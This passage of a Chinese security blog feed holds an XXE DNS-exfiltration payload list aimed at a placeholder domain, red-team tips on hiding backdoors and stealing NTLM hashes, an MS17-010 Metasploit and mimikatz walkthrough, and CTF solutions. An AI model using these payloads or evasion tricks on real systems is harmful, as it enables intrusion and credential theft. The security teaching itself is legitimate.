eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;docutils&#x2F;docutils.dtd&quot;&gt; &lt;!ENTITY % measure &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-23&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;dblatex&#x2F;schema&#x2F;dblatex-config.dtd&quot;&gt; &lt;!ENTITY % attlist.modname &#39;&gt; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-24&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;lib64&#x2F;erlang&#x2F;lib&#x2F;docbuilder-0.9.8.11&#x2F;dtd&#x2F;application.dtd&quot;&gt; &lt;!ENTITY % block &quot;xxx&quot; &gt; &lt;!ENTITY % common &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-25&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;servlet-api.jar!&#x2F;javax&#x2F;servlet&#x2F;resources&#x2F;XMLSchema.dtd&quot;&gt; &lt;!ENTITY % xs-datatypes &#39; &lt;!ENTITY &amp;#x25; file &quot;dns-exfil-26&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:&#x2F;&#x2F;&amp;#x25;file;.yourdomain[.]com&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><h1 id="第六阶段（xxe防御）"><a href="#第六阶段（xxe防御）" class="headerlink" title="第六阶段（xxe防御）"></a>第六阶段（xxe防御）</h1><p>过滤用户提交的XML数据，过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC，禁用外部实体引用。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队手册-创新的红队技术</title>
      <link href="2020/09/19/%E7%BA%A2%E9%98%9F%E6%89%8B%E5%86%8C-%E5%88%9B%E6%96%B0%E7%9A%84%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/"/>
      <url>2020/09/19/%E7%BA%A2%E9%98%9F%E6%89%8B%E5%86%8C-%E5%88%9B%E6%96%B0%E7%9A%84%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“脑洞有多大，攻击面就有多大！”</p></blockquote><p><strong>使用“未报价的服务路径”误导分析人员：</strong></p><p><strong>如果要将后门部署为新服务，那么“Unquoted Service Path”来混淆检测系统和分析人员是一个不错的选择。</strong></p><p>栗子：<br>服务路径：C： Program Files  decoymalware.exe<br>实际恶意软件：C： Program.exe</p><p>可以将合法且经过签名的二进制文件放在此处，那就更加完美了。</p><p><strong>那么什么是“未报价的服务路径”？</strong>当一个服务被创建，其可执行文件路径包含空格和内未封闭的引号，会导致一个漏洞，它允许用户获得SYSTEM权限。在Windows中，如果服务未包含在引号中并具有空格，则它将作为中断处理该空格，并将服务路径的其余部分作为参数传递。</p><p><strong>根本原因：</strong><br>这是由CreateProcess函数引起的，该函数创建一个新进程及其主线程。</p><p>其语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL CreateProcessA（</span><br><span class="line">  LPCSTR lpApplicationName，</span><br><span class="line">  LPSTR lpCommandLine，</span><br><span class="line">  LPSECURITY_ATTRIBUTESlpProcessAttributes，</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpThreadAttributes，</span><br><span class="line">  BOOL bInheritHandles，</span><br><span class="line">  DWORD dwCreationFlags，</span><br><span class="line">  LPVOID lpEnvironment，</span><br><span class="line">  LPCSTR lpCurrentDirectory，</span><br><span class="line">  LPSTARTUPINFOA lpStartupInfo，</span><br><span class="line">  LPPROCESS_INFORMATION lpProcessInformation </span><br><span class="line">）;</span><br></pre></td></tr></table></figure><p>字符串参数<strong>lpApplicationName</strong>。这是将要执行的模块，可以是基于Windows的应用程序。该字符串可以是要执行的模块的完整路径和文件名。如果文件名是包含空格的长字符串文本，并且没有用引号引起来，则文件名将按从左到右的顺序执行，直到到达空格为止，并将在此间隔路径的末尾附加.exe。</p><p>举个栗子：<br>如果我们的要运行服务执行路径为C： Program Files  A子文件夹 B子文件夹 C子文件夹 SomeExecutable.exe</p><p>为了运行SomeExecutable.exe，系统将按照从1到5的以下顺序解释此路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. C：\ Program.exe</span><br><span class="line"></span><br><span class="line">2. C：\ Program Files \ A.exe</span><br><span class="line"></span><br><span class="line">3. C：\ Program Files \ A子文件夹\ B.exe</span><br><span class="line"></span><br><span class="line">4. C：\ Program Files \ A子文件夹\ B子文件夹\ C.exe</span><br><span class="line"></span><br><span class="line">5. C：\ Program Files \ A子文件夹\ B子文件夹\ C子文件夹\ SomeExecutable.exe</span><br></pre></td></tr></table></figure><p>如果找不到C： Program.exe，则将执行C： Program Files  A.exe。如果找不到C： Program Files  A.exe，则将执行C： Program Files  A Subfolder  B.exe，依此类推。</p><p><strong>“使用远程驱动器映射来窃取NTLM哈希：</strong></p><p>可以建立指向远程smb路径的LNK文件。他们的目的是迫使客户端向攻击者的smb服务器进行身份验证，这样，攻击者就可以窃取受害者的NTLM哈希。</p><p><strong>DNS中毒并注入Google Analytics JS：</strong></p><p>通过对普通用户的浏览器活动分析，发现，用户将要访问的网页中可能有一半以上Google Analytics（分析）请求相应JS文件。所以，如果能通过DNS欺骗,MITM或者其他方式替换这些js文件，那么将拥有完美的C2系统来加载恶意软件程序！恶意软件程序甚至都不需要发送单个TCP数据包，只需要把用户的浏览活动作为恶意流量的载体。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次MS17-010的实战利用过程</title>
      <link href="2020/09/19/%E8%AE%B0%E4%B8%80%E6%AC%A1MS17-010%E7%9A%84%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/"/>
      <url>2020/09/19/%E8%AE%B0%E4%B8%80%E6%AC%A1MS17-010%E7%9A%84%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>首先，我们是使用s扫描器扫一波端口并导出文本</p><h2 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h2><p>首先，我们是使用s扫描器扫一波端口并导出文本</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3142475439.png"></p><p>直接上msf（到位！nice！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo msfconsol    进入msf</span><br><span class="line">search ms17     查找对应的ms17</span><br><span class="line"><span class="keyword">use</span> 9    进入<span class="title">ms17</span></span><br><span class="line"><span class="title">set</span> <span class="title">rhost</span> <span class="title">IP</span>    设置相应的<span class="title">IP</span></span><br><span class="line"><span class="title">show</span> <span class="title">options</span>    查看<span class="title">IP</span>是否符合</span><br><span class="line"><span class="title">run</span>     运行</span><br><span class="line"></span><br><span class="line">如果打成功的话就爆一下密码</span><br><span class="line"><span class="title">load</span> <span class="title">mimikatz</span></span><br><span class="line"><span class="title">kerberos</span></span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>如果以上皆成功，就可以撞密码啦~</p><p>先根据得到的账号密码将pass和user文本进行修改</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2370972199.png"></p><p>点击开始即可（万一运气好撞到了就可以连他的3389进行信息收集啦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/63357955.png"></p><p>……</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红队手册-技术信息收集</title>
      <link href="2020/09/18/%E7%BA%A2%E9%98%9F%E6%89%8B%E5%86%8C-%E6%8A%80%E6%9C%AF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2020/09/18/%E7%BA%A2%E9%98%9F%E6%89%8B%E5%86%8C-%E6%8A%80%E6%9C%AF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“技术信息收集包括确定对手所需的情报的关键技术要素的过程，以便最佳地进行攻击。”</p></blockquote><h5 id="常用得手法技巧总结："><a href="#常用得手法技巧总结：" class="headerlink" title="常用得手法技巧总结："></a>常用得手法技巧总结：</h5><p>1.获取OSINT数据集和信息：开源情报（OSINT）是从公开来源收集的情报。这可以包括在线收集的信息，例如从搜索引擎收集的信息，以及在现实世界中收集的信息，各种社交网站，博客，购物网站，快递公司……。</p><p>2.进行主动扫描：主动扫描是将传输发送到终端节点并分析响应以识别有关通信系统的信息的行为。如AWVS,APPSCAN,OPENVAS,NESSUS等。</p><p>3.进行被动扫描：被动扫描是查看现有网络流量以识别有关通信系统的信息的行为。</p><p>4.进行社会工程：社会工程学是操纵人以使他们泄露信息或采取行动的实践。走过最远的路就是红队人员的套路，什么丢U盘，佯装电工什么的，断网攻击啥的，拔网线那必须也是们技术活。</p><p>5.确定第三方基础设施服务：基础结构服务包括操作通信环境所需的硬件，软件和网络资源。该基础结构可以由第三方管理，而不是由所属组织管理。比如用的哪个运营商流量，防火墙用的哪家的，路由器用的哪家的。。。。等等。</p><p>6.确定域和IP地址空间：域名是人类可读的名称，用于表示一个或多个IP地址。IP地址是网络上计算设备的唯一标识符。这两个信息对想要了解网络结构的对手都是有价值的。行话：收集网络资产，越多越好，千里之堤，愧于蚁穴。</p><p>7.确定外部网络信任依赖关系：网络信任启用具有特定访问权限的不同网络之间的通信。网络信任可以包括域信任的实现或虚拟专用网络（VPN）的使用。</p><p>8.确定固件版本：固件是编程到设备只读存储器中的永久软件。与其他类型的软件一样，固件可能会随时间更新并具有多个版本。</p><p>9.发现目标登录/电子邮件地址格式：电子邮件地址，登录凭据和其他形式的在线身份验证通常共享一种通用格式。这使得猜测相同域内的其他凭据变得更加容易。例如，如果已知的电子邮件地址是<a href="mailto:&#109;&#x69;&#110;&#103;&#x7a;&#105;&#64;&#99;&#x6f;&#109;&#x70;&#x61;&#x6e;&#x79;&#x2e;&#x63;&#x6f;&#x6d;">&#109;&#x69;&#110;&#103;&#x7a;&#105;&#64;&#99;&#x6f;&#109;&#x70;&#x61;&#x6e;&#x79;&#x2e;&#x63;&#x6f;&#x6d;</a>，则公司中的其他人很有可能会使用相同格式的电子邮件。</p><p>10.枚举客户端配置:客户端配置信息（例如操作系统和Web浏览器）以及其他信息（例如版本或语言）通常作为Web浏览通信的一部分进行传输。这可以通过多种方式来完成，包括使用受感染的网站来收集有关访问计算机的详细信息。</p><p>11.枚举面向外部的软件应用程序技术，语言和依赖项:将使用不同的技术，语言和依赖关系来构建软件应用程序。此信息可能会找到突破口，撕开口子。</p><p>12.识别职位发布和需求/差距:在公司站点或其他论坛上的职位发布提供有关组织结构的信息，并经常为组织内某人提供联系信息。这可能会提供有关组织内技术的对手信息，这些信息可能对攻击很有用，或者洞悉可能的安全弱点或检测或保护机制的局限性，直接可发送钓鱼邮件攻击。</p><p>13.识别安全防御能力和防御服务：安全防御功能旨在阻止或限制未经授权的网络流量或其他类型的访问，如装的什么杀毒软件，防火墙规则，ids等等。攻击者可以尝试将Web防御服务标识为CloudFlare，IPBan和Snort。这可以通过被动地检测服务（例如CloudFlare路由）或主动地（例如有意地触发安全防御）来完成。</p><p>14.识别供应链：供应链包括用于将产品或服务从供应商转移到消费者的人员，流程和技术。了解供应链可能为攻击提供机会，以利用作为供应链一部分的技术或互连。</p><p>15.确定网络拓扑结构：网络拓扑是网络各种元素（例如，服务器，工作站，打印机，路由器，防火墙等）的布置。映射网络可以使对手了解元素之间的连接或相关方式。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>懒人工具指南-powershell速扫</title>
      <link href="2020/09/15/%E6%87%92%E4%BA%BA%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97-powershell%E9%80%9F%E6%89%AB/"/>
      <url>2020/09/15/%E6%87%92%E4%BA%BA%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97-powershell%E9%80%9F%E6%89%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><p>点点按钮就能完成扫描，上手及其容易<br>前言:“支持外网IP端口探测，局域网IP端口探测，共享资源探测，和天气查询功能，迈入黑客第一步，让你轻松上路！”<br>就这小玩意还挺别致的嗷！</p></blockquote><h1 id="实测："><a href="#实测：" class="headerlink" title="实测："></a>实测：</h1><h2 id="cmd界面"><a href="#cmd界面" class="headerlink" title="cmd界面"></a>cmd界面</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/84398683.png"></p><h2 id="Powershell-gui界面"><a href="#Powershell-gui界面" class="headerlink" title="Powershell-gui界面"></a>Powershell-gui界面</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1128107352.jpg"></p><h2 id="查询ip等信息"><a href="#查询ip等信息" class="headerlink" title="查询ip等信息"></a>查询ip等信息</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/365255538.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/409772878.jpg"></p><h2 id="查询当地天气预报"><a href="#查询当地天气预报" class="headerlink" title="查询当地天气预报"></a>查询当地天气预报</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3292611605.jpg"></p><h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><p>win10以上系统可使用，win7请升级poweeshell到V5版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">附上百度云资源：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1-juOKsi39e7fUAHlBagZxA</span><br><span class="line">提取码：v7ce</span><br><span class="line"></span><br><span class="line">附上powershell学习资料：</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1sIcjKwr4Sk0Jezn8TTytnw</span><br><span class="line">提取码：s765</span><br></pre></td></tr></table></figure><p>在扫描ip网卡信息的时候，杀毒软件会报毒，但其实没毒，就一堆批处理命令。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
            <tag> powershell速扫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑盾杯 2020</title>
      <link href="2020/09/13/2020%E9%BB%91%E7%9B%BE%E6%9D%AF/"/>
      <url>2020/09/13/2020%E9%BB%91%E7%9B%BE%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="0X1-blue"><a href="#0X1-blue" class="headerlink" title="0X1 blue"></a>0X1 blue</h2><p>下载一个压缩包，解压一个图片，好大！！</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/542416461948.png"></p><p>直接binwalk -e提取</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5184655523.png"></p><p>打开zip，发现里面一个pacp文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/814556247.png"></p><p>载入，发现是在进行注入。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5471224569.png"></p><p>直接拉到最下面猜内容那里，找到substr位数变动的那个瞬间，等号后面的就是正确的flag的ascii了</p><h2 id="0X2-encrypt"><a href="#0X2-encrypt" class="headerlink" title="0X2 encrypt"></a>0X2 encrypt</h2><p>Base64两次即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/589859554.png"></p><h2 id="0X3-Trees"><a href="#0X3-Trees" class="headerlink" title="0X3 Trees"></a>0X3 Trees</h2><p>用Stegsolve打开，然后肉眼强行能看出flag：CMISCCTF{coconut_tree}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5156516574.png"></p><h2 id="0X4-Burps"><a href="#0X4-Burps" class="headerlink" title="0X4 Burps"></a>0X4 Burps</h2><p>crc爆破得到密码：the_password_here_cipher，打开flag.txt即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2155523336.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5594449665.png"></p><h2 id="0X5-Blind"><a href="#0X5-Blind" class="headerlink" title="0X5 Blind"></a>0X5 Blind</h2><p>binwalk+foremost得到两张图片，再根据题目不难推出是盲水印Binldwatermark</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5444126879.png"></p><p>额，看不清，用stegsolve打开看看，得到密码：Q@CTF@NX</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/514959453.png"></p><p>得到图片，接着binwalk发现有两张图片，接着010提取出第二张图片，插入12个00并修改为png的文件头</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/747755415.png"></p><p>最后得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8884556652.png"></p><h2 id="0X6-ezAffine"><a href="#0X6-ezAffine" class="headerlink" title="0X6 ezAffine"></a>0X6 ezAffine</h2><p>映射，爆破一下模数（注意这里a-z是0-25</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">a &#x3D; &#39;oelb&#123;6d332l0-22ck-2b1n-a35i-125f3qe125l1&#125;&#39;</span><br><span class="line"></span><br><span class="line">l1 &#x3D; string.ascii_lowercase</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for m in a:</span><br><span class="line">if m in l1:</span><br><span class="line">for i in range(17):</span><br><span class="line">if (i * 146442 + 428428)%17 &#x3D;&#x3D; (ord(m)-97):</span><br><span class="line">flag +&#x3D; chr(i+97)</span><br><span class="line">else:</span><br><span class="line">flag +&#x3D; m</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="0X7-qrcode"><a href="#0X7-qrcode" class="headerlink" title="0X7 qrcode"></a>0X7 qrcode</h2><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5471266889.png"></p><p>解压得到一张图，估计是修复。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/23448489.png"></p><p>手动补全其他两个识别快，然后识别</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/44587774556.png"></p><p>最后得出结果</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/598485965.png"></p><h2 id="0X8-music"><a href="#0X8-music" class="headerlink" title="0X8 music"></a>0X8 music</h2><p>解压，一个music.wav文件，没听出什么莫斯或者其他的，直接查看波形</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1411025489.png"></p><p>试着换成0和1，高频换0或者1各试一次</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/88574569452.png"></p><p>生成，最后</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8846921454.png"></p><p>解出一个rar文件</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/88745884.png"></p><p>解压失败</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/7745999154.png"></p><p>使用管理员才能解压之后打开发现是noooflag，怀疑有隐写，因为需要管理员，所以怀疑是ntfs</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/98455624115.png"></p><p>发现ntfs隐写，导出，</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8514785446.png"></p><p>得到一个二维码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/895818554.png"></p><p>估计是修改了宽高</p><p>用c32改成正方形，得到二维码。</p><p>扫描即可得出flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5864141444.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="0X1-Round"><a href="#0X1-Round" class="headerlink" title="0X1 Round"></a>0X1 Round</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;:D@J::K&#x3D;r&lt;ecXi^[V:XjXit&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in a:</span><br><span class="line">flag +&#x3D; chr(ord(i)+9)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h2 id="0X2-Factor"><a href="#0X2-Factor" class="headerlink" title="0X2 Factor"></a>0X2 Factor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n &#x3D; 3454083680130687060405946528826790951695785465926614724373</span><br><span class="line">e &#x3D; 3</span><br><span class="line">c &#x3D; 1347530713288996422676156069761604101177635382955634367208</span><br><span class="line"></span><br><span class="line">p,r,q &#x3D;   11761833764528579549,17100682436035561357,17172929050033177661</span><br><span class="line"></span><br><span class="line">d &#x3D; gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line"></span><br><span class="line">print long_to_bytes(pow(c,d,p*q))</span><br></pre></td></tr></table></figure><h2 id="0X3-Change"><a href="#0X3-Change" class="headerlink" title="0X3 Change"></a>0X3 Change</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">c&#x3D; 182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090</span><br><span class="line">n&#x3D; 438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437</span><br><span class="line">e &#x3D; 65537 </span><br><span class="line">n1 &#x3D; n&#x2F;&#x2F;(10**600) </span><br><span class="line">n2 &#x3D; (n&#x2F;&#x2F;(10**400))%(10**200) </span><br><span class="line">n3 &#x3D; (n&#x2F;&#x2F;(10**200))%(10**200) </span><br><span class="line">n4 &#x3D; n%(10**200) </span><br><span class="line">AB &#x3D; 0 </span><br><span class="line">if ((n2&#x2F;&#x2F;10**199)&gt;&#x3D;n4&#x2F;&#x2F;(10**199)):</span><br><span class="line">AB&#x3D;n1*(10**200)+n4 </span><br><span class="line">else:</span><br><span class="line">AB &#x3D; (n1-1)*(10**200)+n4 </span><br><span class="line">A2B2 &#x3D; (n-AB*(10**400+1))&#x2F;&#x2F;(10**200)</span><br><span class="line">AaddB &#x3D; int(gmpy2.iroot(A2B2+2*AB,2)[0])</span><br><span class="line">A_B &#x3D; int(gmpy2.iroot((A2B2-2*AB),2)[0])</span><br><span class="line">A &#x3D; (AaddB+A_B)&#x2F;2 </span><br><span class="line">B &#x3D; (AaddB-A_B)&#x2F;2 </span><br><span class="line">p &#x3D; A*(10**200)+B </span><br><span class="line">q &#x3D; B*(10**200)+A 